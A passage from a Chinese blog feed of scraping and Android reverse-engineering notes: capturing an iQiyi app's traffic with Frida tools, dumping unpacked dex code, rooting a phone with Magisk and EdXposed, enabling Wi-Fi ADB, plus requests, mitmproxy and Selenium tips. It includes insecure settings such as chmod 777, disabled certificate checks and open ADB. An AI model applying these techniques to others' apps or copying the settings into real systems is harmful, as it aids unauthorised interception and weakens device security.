title="四、抓包"></a>四、抓包</h3><p><a href="https://github.com/r0ysue/r0capture">r0capture</a></p><ol><li>启动frida-server</li><li>打开APP</li><li>输入命令</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attach</span></span><br><span class="line">python D:\Projects\learn_forever\Spider\r0capture\r0capture.py -U com.qiyi.video -v -p iqiyi.pcap</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Spawn</span></span><br><span class="line">python D:\Projects\learn_forever\Spider\r0capture\r0capture.py -U -f com.qiyi.video -v -p iqiyi.pcap</span><br></pre></td></tr></table></figure><h3 id="五、脱壳"><a href="#五、脱壳" class="headerlink" title="五、脱壳"></a>五、脱壳</h3><p><a href="https://github.com/hluwa/frida-dexdump">frida-dexdump</a></p><ol><li>启动frida-server</li><li>打开APP</li><li>输入命令</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida-dexdump</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No105：Android逆向环境搭建</title>
      <link href="/posts/af392f23.html"/>
      <url>/posts/af392f23.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、基本知识"><a href="#一、基本知识" class="headerlink" title="一、基本知识"></a>一、基本知识</h3><ol><li>Bootloader锁、Recovery、Fastboot、高通9008模式、OTA、System分区、A&#x2F;B分区、全盘加密&#x2F;加密分区等</li><li>ADB、SuperSU(Magisk)、Xposed(EdXposed，LSPposed)、Frida、Unidbg(Unicorn)等</li></ol><h3 id="二、准备工作"><a href="#二、准备工作" class="headerlink" title="二、准备工作"></a>二、准备工作</h3><ol><li><p><a href="https://developer.android.com/studio/run/win-usb">下载Google USB驱动程序</a></p></li><li><p><a href="https://developers.google.com/android/images">下载Google 官方镜像文件</a></p></li><li><p><a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh_cn">下载SDK Platform Tools</a></p></li><li><p><a href="https://twrp.me/Devices/">下载TWRP</a></p></li><li><p><a href="https://github.com/topjohnwu/Magisk/releases">下载Magisk</a></p></li><li><p><a href="https://github.com/RikkaApps/Riru/releases">下载Riru</a></p></li><li><p><a href="https://github.com/ElderDrivers/EdXposed/releases">下载EdXposed</a></p></li><li><p><a href="https://github.com/ElderDrivers/EdXposedManager/releases">下载EdXposedManager</a></p></li><li><p><a href="https://github.com/frida/frida/releases">下载Frida</a></p></li><li><p>备份手机资料，退出谷歌账号，关闭指纹识别以及锁屏密码</p></li></ol><h3 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h3><h4 id="1-连接手机"><a href="#1-连接手机" class="headerlink" title="1.连接手机"></a>1.连接手机</h4><ol><li><p>手机开启开发者选项，打开USB调试模式</p></li><li><p>电脑安装Google USB驱动程序</p></li><li><p>电脑将adb添加到环境变量中</p></li><li><p>解BL锁</p></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启进入bootloader</span></span><br><span class="line">adb reboot bootloader</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接情况</span></span><br><span class="line">fastboot devices</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解锁手机</span></span><br><span class="line">fastboot oem unlock</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否已经解锁</span></span><br><span class="line">fastboot oem device-info</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Device unlocked: <span class="literal">true</span> 则表示已经解锁。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启手机</span></span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure><h4 id="2-刷入系统"><a href="#2-刷入系统" class="headerlink" title="2.刷入系统"></a>2.刷入系统</h4><ol><li><p>解压镜像文件，找到flash-all.bat文件并运行</p></li><li><p>大概3-5分钟，刷机就成功了，完成开机设置，开启开发者选项，打开USB调试模式</p></li></ol><h4 id="3-刷入Magisk"><a href="#3-刷入Magisk" class="headerlink" title="3.刷入Magisk"></a>3.刷入Magisk</h4><h5 id="1-使用说明"><a href="#1-使用说明" class="headerlink" title="1.使用说明"></a>1.使用说明</h5><ol><li>从V22版本以后三合一，管理器APP、安装包、卸载包<ul><li>Magisk-v22.0.apk，管理器APP</li><li>Magisk-v22.0.zip，安装包</li><li>uninstall.zip，卸载包</li></ul></li><li>V23版本有MagiskHide，可以在线安装模块</li><li>V23以上版本有Zygisk，可以从本地安装模块</li></ol><h5 id="2-twrp方式"><a href="#2-twrp方式" class="headerlink" title="2.twrp方式"></a>2.twrp方式</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启进入bootloader</span></span><br><span class="line">adb reboot bootloader</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看连接情况</span></span><br><span class="line">fastboot devices</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时刷入</span></span><br><span class="line">fastboot boot twrp-3.3.0-0-sailfish.img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">临时刷入，A/B分区设备</span></span><br><span class="line">fastboot flash boot twrp-3.3.0-0-sailfish.img</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">A/B分区设备永久刷入需要在twrp中安装twrp-pixel-installer-sailfish-3.3.0-0.zip</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永久刷入，非A/B分区设备</span></span><br><span class="line">fastboot flash recovery twrp-3.3.0-0-sailfish.img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启进入Recovery，出现安全警告时直接拖动滑块允许修改</span></span><br><span class="line">fastboot reboot recovery</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将下载好的Magisk-v23.0.zip传到手机的sdcard目录中</span></span><br><span class="line">adb push Magisk-v23.0.zip /sdcard</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入TWRP的安装(install)页面，选中刚刚准备好的Magisk的包，刷入它，然后重启</span></span><br></pre></td></tr></table></figure><h5 id="3-boot方式"><a href="#3-boot方式" class="headerlink" title="3.boot方式"></a>3.boot方式</h5><ol><li>获取boot.img<ul><li>Google的官方镜像可以直接解压获取boot.img</li><li>一加手机<a href="https://www.daxiaamu.com/5795/">获取方法</a></li></ul></li><li>安装Magisk Manager Apk(Magisk-v22.0.apk)</li><li>将boot.img文件传到手机中，在手机上打开Magisk，选择安装-修补一个文件-选择boot.img文件，打完补丁后是Download目录里magisk_patched.img文件</li><li>将magisk_patched.img文件传到电脑中</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入fastboot模式</span></span><br><span class="line">adb reboot fastboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">刷入magisk_patched.img</span></span><br><span class="line">fastboot flash boot magisk_patched.img</span><br></pre></td></tr></table></figure><h4 id="4-刷入EdXposed"><a href="#4-刷入EdXposed" class="headerlink" title="4.刷入EdXposed"></a>4.刷入EdXposed</h4><ol><li><p>安装Magisk模块：Riru（作者：Rikka）</p></li><li><p>安装Magisk模块：EdXposed（作者：SandHook）</p></li><li><p>安装EdXposedManager</p></li></ol><h4 id="5-刷入Frida"><a href="#5-刷入Frida" class="headerlink" title="5.刷入Frida"></a>5.刷入Frida</h4><ul><li>安装步骤</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推送文件</span></span><br><span class="line">adb push fs14arm64 /data/local/tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改权限</span></span><br><span class="line">chmod 777 /data/local/tmp/fs14arm64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启服务</span></span><br><span class="line">./data/local/tmp/fs14arm64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证服务</span></span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><ul><li>版本推荐</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python3.7 Android8.1</span></span><br><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line">pip install objection==1.8.4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python3.8 Android10</span></span><br><span class="line">pip install frida==14.2.17</span><br><span class="line">pip install frida-tools==9.2.4</span><br><span class="line">pip install objection==1.11.0</span><br></pre></td></tr></table></figure><h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><h4 id="1-开机自启WiFi-ADB"><a href="#1-开机自启WiFi-ADB" class="headerlink" title="1.开机自启WiFi-ADB"></a>1.开机自启WiFi-ADB</h4><ul><li><p>build.prop位于手机的&#x2F;system&#x2F;build.prop中，build.prop记录一些系统设置，是一个属性文件，相当于Windows系统的注册表</p></li><li><p>build.prop文件的权限为644</p></li><li><p>末尾添加</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WiFi-ADB</span></span><br><span class="line">service.adb.tcp.port=5555</span><br><span class="line">persist.service.adb.enable=1</span><br></pre></td></tr></table></figure><ul><li>修改权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 644 /system/build.prop</span><br></pre></td></tr></table></figure><h4 id="2-WiFi图标除去叉号"><a href="#2-WiFi图标除去叉号" class="headerlink" title="2.WiFi图标除去叉号"></a>2.WiFi图标除去叉号</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell &quot;settings put global captive_portal_https_url http://connect.rom.miui.com/generate_204&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> Android逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No104：MitmProxy设置二级代理</title>
      <link href="/posts/c606dfed.html"/>
      <url>/posts/c606dfed.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、应用场景"><a href="#1、应用场景" class="headerlink" title="1、应用场景"></a>1、应用场景</h3><p>需要对设备进行监听抓包，且设备需要通过代理ip与外部进行通信。</p><h3 id="2、基本原理"><a href="#2、基本原理" class="headerlink" title="2、基本原理"></a>2、基本原理</h3><p>受监听设备通过mitmproxy代理，然后mitmproxt将设备的请求转发到与外部交互的代理(下面称为外层代理)，<br>从外部代理返回的响应也会经过mitmproxy再给到设备。相当于在设备与外部代理之间加上了一个mitmproxy代理进行监听。</p><h3 id="3、使用方法"><a href="#3、使用方法" class="headerlink" title="3、使用方法"></a>3、使用方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TeestMitmProxy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;mitmproxy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理经过mitmproxy的请求&quot;&quot;&quot;</span></span><br><span class="line">        address = (<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">7890</span>)  <span class="comment"># 这里输入的是外层代理</span></span><br><span class="line">        <span class="keyword">if</span> flow.live:</span><br><span class="line">            flow.live.change_upstream_proxy_server(address)  <span class="comment"># 这里将请求转发到了外部代理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理经过mitmproxy的响应&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(flow.request.url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [TeestMitmProxy()]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动命令</span></span><br><span class="line">mitmdump.exe --mode upstream:http://127.0.0.1:7890/ -s D:/test.py -p 3838</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No103：PyExecJS常见问题汇总</title>
      <link href="/posts/b991b123.html"/>
      <url>/posts/b991b123.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、编码未指定"><a href="#1、编码未指定" class="headerlink" title="1、编码未指定"></a>1、编码未指定</h3><ul><li>问题描述</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># UnicodeEncodeError: &#x27;gbk&#x27; codec can&#x27;t encode character &#x27;\ufffd&#x27; in position 160: illegal multibyte sequence</span></span><br></pre></td></tr></table></figure><p>该异常出现的场景为在Windows系统下使用PyExecJS运行JS代码，JS代码中包含中文或其他特殊字符。</p><ul><li>解决方法为</li></ul><p>修改Python安装目录下lib文件夹里的subprocess.py文件<br>(C:\Users\Administrator\AppData\Local\Programs\Python\Python38\Lib\subprocess.py)<br>修改encoding&#x3D;None为encoding&#x3D;”utf-8”</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, args, bufsize=-<span class="number">1</span>, executable=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">             stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">             preexec_fn=<span class="literal">None</span>, close_fds=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">             shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, universal_newlines=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">             startupinfo=<span class="literal">None</span>, creationflags=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">             restore_signals=<span class="literal">True</span>, start_new_session=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">             pass_fds=(<span class="params"></span>), *, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="literal">None</span>, text=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Create new Popen instance.&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No102：Requests添加Cookie的2种方式</title>
      <link href="/posts/8af8bcf2.html"/>
      <url>/posts/8af8bcf2.html</url>
      
        <content type="html"><![CDATA[<ul><li>把cookie先写成字典形式，然后把字典转换为cookiejar</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.cookies <span class="keyword">import</span> cookiejar_from_dict</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：这个方法会替换掉原有的cookies</span></span><br><span class="line"><span class="comment"># 开启一个会话Session</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># 从chrome浏览器中取到的cookie值</span></span><br><span class="line">cookie_dict = &#123;</span><br><span class="line">        <span class="string">&quot;49BAC005-7D5B-4231-8CEA-16939BEACD67&quot;</span>: <span class="string">&quot;cktest001&quot;</span>,</span><br><span class="line">        <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;F4FFF69B8XXXXXXC8DCB4C061C0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;JSESSIONIDSSO&quot;</span>: <span class="string">&quot;9D49C76FD6XXXXXF294242B44A&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 把cookie值转换为cookiejar类型，然后传给Session</span></span><br><span class="line">session.cookies = cookiejar_from_dict(cookie_dict, cookiejar=<span class="literal">None</span>, overwrite=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(session.cookies)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>追加cookies</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.cookies <span class="keyword">import</span> RequestsCookieJar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启一个会话Session</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># 创建一个Cookie Jar对象</span></span><br><span class="line">jar = RequestsCookieJar()</span><br><span class="line"><span class="comment"># 向Cookie Jar对象中添加cookie值</span></span><br><span class="line">jar.<span class="built_in">set</span>(<span class="string">&quot;49BAC005-7D5B-4231-8CEA-1XXXXBEACD67&quot;</span>, <span class="string">&quot;cktXXXX001&quot;</span>)</span><br><span class="line">jar.<span class="built_in">set</span>(<span class="string">&quot;JSESSIONID&quot;</span>, <span class="string">&quot;F4FFF69B8CXXXX80F0C8DCB4C061C0&quot;</span>)</span><br><span class="line">jar.<span class="built_in">set</span>(<span class="string">&quot;JSESSIONIDSSO&quot;</span>, <span class="string">&quot;9D49C7XXXX448FDF5B0F294242B44A&quot;</span>)</span><br><span class="line"><span class="comment"># 把cookies追加到Session中</span></span><br><span class="line">session.cookies.update(jar)</span><br><span class="line"><span class="built_in">print</span>(session.cookies)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No101：Requests设置“verify=False”时忽略Warning方法</title>
      <link href="/posts/8284c0b4.html"/>
      <url>/posts/8284c0b4.html</url>
      
        <content type="html"><![CDATA[<ul><li>问题描述</li></ul><p>使用Python3的requests发送HTTPS请求，关闭认证（verify&#x3D;False）情况下，控制台会输出警告。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">InsecureRequestWarning: Unverified HTTPS request is being made.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Adding certificate verification is strongly advised.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>解决办法</li></ul><p>在语句前加上以下代码即可不会输出警告。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib3 <span class="keyword">import</span> disable_warnings</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略HTTPS警告</span></span><br><span class="line">disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No100：Requests详解</title>
      <link href="/posts/56eac77d.html"/>
      <url>/posts/56eac77d.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、基本介绍"><a href="#1、基本介绍" class="headerlink" title="1、基本介绍"></a>1、基本介绍</h3><ul><li>requests方法构造一个向服务器请求资源的Request对象，返回一个包含服务器资源的Response对象</li></ul><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>requests.request()</td><td>构造一个请求，支撑一下各方法的基础方法</td></tr><tr><td>requests.get()</td><td>获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td>requests.head()</td><td>获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td>requests.post()</td><td>向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td>requests.put()</td><td>向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td>requests.patch()</td><td>向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td>requests.delete()</td><td>向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><ul><li>response对象的属性</li></ul><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>response.status_code</td><td>HTTP请求的返回状态</td></tr><tr><td>response.text</td><td>HTTP响应内容的字符串形式</td></tr><tr><td>response.encoding</td><td>从HTTP header中猜测的响应内容编码方式(默认编码为ISO-8859-1)</td></tr><tr><td>response.apparent_encoding</td><td>从内容分析出的响应内容编码方式(备选编码方式)</td></tr><tr><td>response.content</td><td>HTTP响应内容的二进制形式</td></tr></tbody></table><h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">requests.get(url, params=<span class="literal">None</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">requests.post(url, data=<span class="literal">None</span>, json=<span class="literal">None</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">requests.head(url, **kwargs)</span><br><span class="line"></span><br><span class="line">requests.delete(url, **kwargs)</span><br><span class="line"></span><br><span class="line">requests.put(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">requests.patch(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、参数"><a href="#3、参数" class="headerlink" title="3、参数"></a>3、参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPProxyAuth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典，HTTP请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典或CookieJar，Request中的cookie</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;_ga&quot;</span>: <span class="string">&quot;GA1.2.311358392.1610634651&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典或字节序列，作为参数增加到url中</span></span><br><span class="line">params = &#123;<span class="string">&quot;k1&quot;</span>: <span class="string">&quot;v1&quot;</span>, <span class="string">&quot;k2&quot;</span>: <span class="string">&quot;v2&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典、字节序列或文件对象，作为Request的对象</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># JSON格式的数据，作为Request的内容</span></span><br><span class="line">json = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组，支持HTTP认证功能</span></span><br><span class="line">auth = HTTPProxyAuth(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;passwd&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典类型，传输文件</span></span><br><span class="line">files = file = &#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设定超时时间，秒为单位</span></span><br><span class="line">timeout = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典类型，设置访问代理服务器，可以增加登录认证</span></span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://61.24.25.21:5011/&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://61.24.25.21:5011/&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认为Ture，重定向开关</span></span><br><span class="line">allow_redirects = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认为True，获取内容立即下载开关</span></span><br><span class="line">stream = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认为True，认证SSL证书开关</span></span><br><span class="line">verigy = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地SSL证书路径</span></span><br><span class="line">cert = (<span class="string">&quot;xxx/xxx/xxx/xxx/pem&quot;</span>, <span class="string">&quot;yyy/yyy/yyy.key&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No99：Selenium设置浏览器常用参数详解</title>
      <link href="/posts/434b3612.html"/>
      <url>/posts/434b3612.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、Options和ChromeOptions"><a href="#一、Options和ChromeOptions" class="headerlink" title="一、Options和ChromeOptions"></a>一、Options和ChromeOptions</h3><p>两种方法都可以，指向的源代码都一样。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">options1 = Options()</span><br><span class="line">options2 = ChromeOptions()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、常用方法详解"><a href="#二、常用方法详解" class="headerlink" title="二、常用方法详解"></a>二、常用方法详解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">options = Options()</span><br><span class="line"><span class="comment"># 添加启动参数</span></span><br><span class="line">options.add_argument(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 添加扩展应用</span></span><br><span class="line">options.add_extension(<span class="string">&quot;&quot;</span>)</span><br><span class="line">options.add_encoded_extension(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 添加实验性质的设置参数</span></span><br><span class="line">options.add_experimental_option(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 设置调试器地址</span></span><br><span class="line">options.debugger_address(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、常用参数详解"><a href="#三、常用参数详解" class="headerlink" title="三、常用参数详解"></a>三、常用参数详解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">options = Options()</span><br><span class="line"><span class="comment"># 无界面</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line"><span class="comment"># 无痕模式</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--incognito&quot;</span>)</span><br><span class="line"><span class="comment"># 以最高权限运行</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止硬件加速</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line"><span class="comment"># 设置语言</span></span><br><span class="line">options.add_argument(<span class="string">&quot;lang=zh-CN&quot;</span>)</span><br><span class="line"><span class="comment"># 设置最大化窗口</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--start-maximized&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止显示&quot;Chrome 正受到自动测试软件的控制。&quot;</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-infobars&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止拓展</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line"><span class="comment"># 禁止JavaScript</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-javascript&quot;</span>)</span><br><span class="line"><span class="comment"># 设置代理</span></span><br><span class="line">options.add_argument(<span class="string">&quot;--proxy-server=proxy&quot;</span>)</span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">options.add_argument(<span 